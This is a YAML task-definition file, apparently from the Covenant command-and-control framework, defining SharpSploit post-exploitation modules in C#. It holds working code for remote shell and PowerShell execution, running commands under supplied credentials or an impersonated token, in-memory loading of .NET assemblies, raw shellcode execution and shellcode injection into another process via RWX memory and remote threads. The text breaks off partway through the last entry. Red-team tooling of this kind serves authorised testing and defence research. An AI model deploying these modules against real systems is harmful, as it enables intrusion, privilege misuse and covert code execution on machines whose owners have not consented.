- Name: Shell
  Aliases:
  - CreateProcess
  Description: Execute a Shell command using CreateProcess.
  Author: 
      Name: Ryan Cobb
      Handle: cobbr_io
      Link: https://twitter.com/cobbr_io
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;

    using SharpSploit.Execution;

    public static class Task
    {
        public static string Execute(string ShellCommand)
        {
            try
            {
                return Shell.CreateProcess(ShellCommand);
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: ShellCommand
    Value: whoami
    DefaultValue: ''
    Description: The ShellCommand to execute.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions: &o0
    - Net35
    - Net40
    ReferenceAssemblies:
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: ShellCmd
  Aliases:
  - CreateCmdProcess
  - cmd
  Description: Execute a Shell command using CreateProcess with "cmd.exe /c"
  Author: 
      Name: Ryan Cobb
      Handle: cobbr_io
      Link: https://twitter.com/cobbr_io
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;

    using SharpSploit.Execution;

    public static class Task
    {
        public static string Execute(string ShellCommand)
        {
            try
            {
                return Shell.CreateCmdProcess(ShellCommand);
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: ShellCommand
    Value: whoami
    DefaultValue: ''
    Description: The ShellCommand to execute.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions: *o0
    ReferenceAssemblies:
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: ShellRunAs
  Aliases:
  - CreateProcessAsUser
  - runas
  Description: Execute a Shell command using CreateProcess as a specified user.
  Author: 
      Name: Ryan Cobb
      Handle: cobbr_io
      Link: https://twitter.com/cobbr_io
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;

    using SharpSploit.Execution;

    public static class Task
    {
        public static string Execute(string ShellCommand, string Username, string Domain, string Password)
        {
            try
            {
                return Shell.CreateProcess(ShellCommand, Username, Domain, Password);
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: ShellCommand
    Value: whoami
    DefaultValue: ''
    Description: The ShellCommand to execute.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Username
    Value: ''
    DefaultValue: ''
    Description: The username to execute as.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Domain
    Value: ''
    DefaultValue: ''
    Description: The domain to execute as.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Password
    Value: ''
    DefaultValue: ''
    Description: The password to execute as.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions: *o0
    ReferenceAssemblies:
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: ShellCmdRunAs
  Aliases:
  - CreateCmdProcessAsUser
  - runascmd
  Description: Execute a Shell command using CreateProcess with "cmd.exe /c" as a specified user.
  Author: 
      Name: Ryan Cobb
      Handle: cobbr_io
      Link: https://twitter.com/cobbr_io
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;

    using SharpSploit.Execution;

    public static class Task
    {
        public static string Execute(string ShellCommand, string Username, string Domain, string Password)
        {
            try
            {
                return Shell.CreateCmdProcess(ShellCommand, Username, Domain, Password);
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: ShellCommand
    Value: whoami
    DefaultValue: ''
    Description: The ShellCommand to execute.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Username
    Value: ''
    DefaultValue: ''
    Description: The username to execute as.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Domain
    Value: ''
    DefaultValue: ''
    Description: The domain to execute as.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Password
    Value: ''
    DefaultValue: ''
    Description: The password to execute as.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions: *o0
    ReferenceAssemblies:
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: CreateProcessWithToken
  Aliases: []
  Description: Creates a process with the currently impersonated token.
  Author: 
      Name: Calvin Hedler
      Handle: 001SPARTaN
      Link: https://twitter.com/001SPARTaN
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;
    using System.Security.Principal;

    using SharpSploit.Execution;

    public static class Task
    {
        public static string Execute(string Command, string Path)
        {
            try
            {
                return Shell.CreateProcessWithToken(Command, Path, WindowsIdentity.GetCurrent().Token);
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: Command
    Value: calc.exe
    DefaultValue: ''
    Description: The process to create.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Path
    Value: C:\Windows\System32
    DefaultValue: C:\Windows\System32
    Description: The working directory from which to create a new process.
    SuggestedValues: []
    Optional: true
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions: &o0
    - Net35
    - Net40
    ReferenceAssemblies:
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: PowerShell
  Aliases: []
  Description: Execute a PowerShell command.
  Author: 
      Name: Ryan Cobb
      Handle: cobbr_io
      Link: https://twitter.com/cobbr_io
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;

    using SharpSploit.Execution;

    public static class Task
    {
        public static string Execute(string PowerShellCommand)
        {
            try
            {
                return Shell.PowerShellExecute(PowerShellCommand, true);
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: PowerShellCommand
    Value: 'Get-ChildItem Env:'
    DefaultValue: ''
    Description: The PowerShellCommand to execute.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions: *o0
    ReferenceAssemblies:
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: Assembly
  Aliases: []
  Description: Execute a dotnet Assembly EntryPoint.
  Author: 
      Name: Ryan Cobb
      Handle: cobbr_io
      Link: https://twitter.com/cobbr_io
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;
    using System.IO;
    using System.Linq;
    using System.Collections.Generic;

    using SharpSploit.Execution;
    
    public static class Task
    {
        public static Stream OutputStream { get; set; }
        public static string Execute(string Assembly, string AssemblyName, string Parameters = "")
        {
            try
            {
                string[] args = SplitCommandLine(Parameters).ToArray();
                
                TextWriter realStdOut = Console.Out;
                TextWriter realStdErr = Console.Error;
                StreamWriter stdOutWriter = new StreamWriter(OutputStream);
                StreamWriter stdErrWriter = new StreamWriter(OutputStream);
                stdOutWriter.AutoFlush = true;
                stdErrWriter.AutoFlush = true;
                Console.SetOut(stdOutWriter);
                Console.SetError(stdErrWriter);
                
                SharpSploit.Execution.Assembly.AssemblyExecute(Assembly, new Object[] { args });
                
                Console.Out.Flush();
                Console.Error.Flush();
                Console.SetOut(realStdOut);
                Console.SetError(realStdErr);
                
                OutputStream.Close();
                return "";
            }
            catch (Exception e)
            {
              if (OutputStream != null)
              {
                OutputStream.Close();
              }
              return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace + Environment.NewLine + e.InnerException.GetType().FullName + ": " + e.InnerException.Message + Environment.NewLine + e.InnerException.StackTrace;
            }
        }

        // Credit: https://stackoverflow.com/a/298990
        private static IEnumerable<string> SplitCommandLine(string commandLine)
        {
            bool inQuotes = false;

            return commandLine.Split(c =>
            {
                if (c == '\"' || c == '\'')
                    inQuotes = !inQuotes;

                return !inQuotes && c == ' ';
            })
                .Select(arg => arg.Trim().TrimMatchingQuotes('\"').TrimMatchingQuotes('\''))
                .Where(arg => !string.IsNullOrEmpty(arg));
        }

        private static IEnumerable<string> Split(this string str, Func<char, bool> controller)
        {
            int nextPiece = 0;

            for (int c = 0; c < str.Length; c++)
            {
                if (controller(str[c]))
                {
                    yield return str.Substring(nextPiece, c - nextPiece);
                    nextPiece = c + 1;
                }
            }

            yield return str.Substring(nextPiece);
        }

        private static string TrimMatchingQuotes(this string input, char quote)
        {
            if ((input.Length >= 2) && 
                (input[0] == quote) && (input[input.Length - 1] == quote))
                return input.Substring(1, input.Length - 2);

            return input;
        }
    }
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: Assembly
    Value: ''
    DefaultValue: ''
    Description: The Base64 encoded Assembly bytes.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: false
    FileOption: true
  - Name: AssemblyName
    Value: ''
    DefaultValue: ''
    Description: Name of the assembly.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Parameters
    Value: ''
    DefaultValue: ''
    Description: The command-line parameters to pass to the assembly's EntryPoint.
    SuggestedValues: []
    Optional: true
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions: *o0
    ReferenceAssemblies:
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: AssemblyReflect
  Aliases: []
  Description: Execute a dotnet Assembly method using reflection.
  Author: 
      Name: Ryan Cobb
      Handle: cobbr_io
      Link: https://twitter.com/cobbr_io
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;
    using System.IO;
    using System.Linq;

    using SharpSploit.Generic;
    using SharpSploit.Execution;
    
    public static class Task
    {
        public static Stream OutputStream { get; set; }
        public static string Execute(string Assembly, string AssemblyName, string TypeName, string MethodName, string Parameters = "")
        {
            try
            {
                Object[] args = default(Object[]);
                if (Parameters != null && Parameters != "")  { args = Parameters.Split(',').Select(P => (Object)P).ToArray(); }
                
                TextWriter realStdOut = Console.Out;
                TextWriter realStdErr = Console.Error;
                StreamWriter stdOutWriter = new StreamWriter(OutputStream);
                StreamWriter stdErrWriter = new StreamWriter(OutputStream);
                stdOutWriter.AutoFlush = true;
                stdErrWriter.AutoFlush = true;
                Console.SetOut(stdOutWriter);
                Console.SetError(stdErrWriter);
                
                GenericObjectResult result = SharpSploit.Execution.Assembly.AssemblyExecute(Assembly, TypeName, MethodName, args);
                
                Console.Out.Flush();
                Console.Error.Flush();
                Console.SetOut(realStdOut);
                Console.SetError(realStdErr);
                
                OutputStream.Close();
                return "";
            }
            catch (Exception e)
            {
              if (OutputStream != null)
              {
                OutputStream.Close();
              }
              return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace + Environment.NewLine + e.InnerException.GetType().FullName + ": " + e.InnerException.Message + Environment.NewLine + e.InnerException.StackTrace;
            }
        }
    }
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: Assembly
    Value: ''
    DefaultValue: ''
    Description: The Base64 encoded Assembly bytes.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: false
    FileOption: true
  - Name: AssemblyName
    Value: ''
    DefaultValue: ''
    Description: Name of the assembly.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: TypeName
    Value: ''
    DefaultValue: ''
    Description: The name of the Type that contains the method to execute.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: MethodName
    Value: ''
    DefaultValue: ''
    Description: The name of the method to execute.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: Parameters
    Value: ''
    DefaultValue: ''
    Description: The parameters to pass to the method.
    SuggestedValues: []
    Optional: true
    DisplayInCommand: true
    FileOption: false
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions: *o0
    ReferenceAssemblies:
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: ShellCode
  Aliases: []
  Description: Executes a specified shellcode byte array by copying it to pinned memory, modifying the memory permissions, and executing.
  Author: 
      Name: Ryan Cobb
      Handle: cobbr_io
      Link: https://twitter.com/cobbr_io
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: |
    using System;
    
    using SharpSploit.Execution;
    
    public static class Task
    {
        public static string Execute(string payload)
        {
            try
            {
                if (ShellCode.ShellCodeExecute(Convert.FromBase64String(payload)))
                {
                    return "ShellCode execution succeeded.";
                }
                else
                {
                    return "ShellCode execution failed.";
                }
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: ShellCode
    Value: ''
    DefaultValue: ''
    Description: ShellCode to execute.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: false
    FileOption: true
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions:
    - Net35
    - Net40
    ReferenceAssemblies:
    - Name: System.Management.Automation.dll
      Location: net35\System.Management.Automation.dll
      DotNetVersion: Net35
    - Name: System.Management.dll
      Location: net40\System.Management.dll
      DotNetVersion: Net40
    - Name: System.Management.Automation.dll
      Location: net40\System.Management.Automation.dll
      DotNetVersion: Net40
    - Name: System.IdentityModel.dll
      Location: net40\System.IdentityModel.dll
      DotNetVersion: Net40
    - Name: System.dll
      Location: net40\System.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: mscorlib.dll
      Location: net40\mscorlib.dll
      DotNetVersion: Net40
    - Name: System.Management.dll
      Location: net35\System.Management.dll
      DotNetVersion: Net35
    - Name: mscorlib.dll
      Location: net35\mscorlib.dll
      DotNetVersion: Net35
    - Name: System.Core.dll
      Location: net35\System.Core.dll
      DotNetVersion: Net35
    - Name: System.DirectoryServices.dll
      Location: net35\System.DirectoryServices.dll
      DotNetVersion: Net35
    - Name: System.dll
      Location: net35\System.dll
      DotNetVersion: Net35
    - Name: System.IdentityModel.dll
      Location: net35\System.IdentityModel.dll
      DotNetVersion: Net35
    EmbeddedResources: []
  ReferenceAssemblies: []
  EmbeddedResources: []
- Name: ProcessInjection
  Aliases: []
  Author:
    Name: ''
    Handle: ''
    Link: ''
  Description: inject test
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: "using System;\nusing System.Diagnostics;\n\nusing SharpSploit.Execution;\nusing SharpSploit.Execution.Injection;\n\npublic static class Task\n{\n	public static string Execute(string Technique, string ProcessID, string ShellCode)\n	{\n		string output = \"\";\n		RemoteThreadCreate.APIS apiTechnique;\n\n		if (Technique == \"CreateRemoteThread\") {apiTechnique = RemoteThreadCreate.APIS.CreateRemoteThread;}\n		else if (Technique == \"NtCreateThreadEx\") {apiTechnique = RemoteThreadCreate.APIS.NtCreateThreadEx;}\n		else if (Technique == \"RtlCreateUserThread\") {apiTechnique = RemoteThreadCreate.APIS.RtlCreateUserThread;}\n		//TODO review how to detect empty string  \n        else if (Technique == \"\" || Technique == \"\\\"\")\n		{\n			apiTechnique = RemoteThreadCreate.APIS.CreateRemoteThread;\n			output += \"No technique passed as argument. CreateRemoteThread technique was used\\n\";\n		}\n		else\n        {\n			output += \"Injection technique \" + Technique + \" is not implemented. Choose one of the following values:\\n\" +\n				\"CreateRemoteThread\\n\" +\n				\"NtCreateThreadEx\\n\" +\n				\"RtlCreateUserThread\\n\";\n			return output;\n		}\n        \n		try\n		{\n			int ProcID = Int32.Parse(ProcessID);\n			Process proc = Process.GetProcessById(ProcID);\n			RemoteThreadCreate injectionTechnique = new RemoteThreadCreate\n			{\n				api = apiTechnique,\n				suspended = false\n			};\n			SectionMapAlloc allocationTechnique = new SectionMapAlloc\n			{\n				localSectionPermissions = Win32.WinNT.PAGE_READWRITE,\n				remoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE,\n				sectionAttributes = Win32.WinNT.SEC_COMMIT\n			};\n\n			PICPayload payload = new PICPayload(Convert.FromBase64String(ShellCode));\n			IntPtr payloadLocation = allocationTechnique.Allocate(payload, proc);\n			Injector.Inject(payload, allocationTechnique, injectionTechnique, proc);\n			\n			output += \"attempting to inject the provided shellcode into process \" + proc.ProcessName + \" with PID \" + ProcessID;\n			return output;\n		}\n		catch (Exception e) { return e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace; }\n		return output;\n	}\n}\n\n"
  TaskingType: Assembly
  UnsafeCompile: false
  TokenTask: false
  Options:
  - Name: Technique
    Value: ''
    DefaultValue: CreateRemoteThread
    Description: Injection technique
    SuggestedValues:
    - CreateRemoteThread
    - NtCreateThreadEx
    - RtlCreateUserThread
    Optional: true
    DisplayInCommand: true
    FileOption: false
  - Name: ProcessID
    Value: ''
    DefaultValue: ''
    Description: Process ID of the process to impersonate
    SuggestedValues: []
    Optional: false
    DisplayInCommand: true
    FileOption: false
  - Name: ShellCode
    Value: ''
    DefaultValue: ''
    Description: ShellCode to Inject.
    SuggestedValues: []
    Optional: false
    DisplayInCommand: false
    FileOption: true
  ReferenceSourceLibraries:
  - Name: SharpSploit
    Description: SharpSploit is a library for C# post-exploitation modules.
    Location: SharpSploit\SharpSploit\
    Language: CSharp
    CompatibleDotNetVersions:
    - Net35
    - Net40
    ReferenceAssemblies:
    - Name: System.Core.dll
      Location: net40\System.Core.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.dll
      Location: net40\System.DirectoryServices.dll
      DotNetVersion: Net40
    - Name: System.DirectoryServices.Protocols.dll
